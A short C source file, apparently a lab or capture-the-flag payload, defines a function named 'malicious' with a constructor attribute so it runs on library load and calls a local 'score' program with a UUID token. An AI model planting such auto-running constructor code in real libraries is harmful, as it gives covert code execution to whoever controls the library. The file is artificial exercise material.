#include<stdio.h>
#include<stdlib.h>
 
static void malicious() __attribute__((constructor));
 
void malicious() {
  system("/usr/local/bin/score 6f2d8fb9-f8bb-443b-9f9c-2e3ae5886734");
}
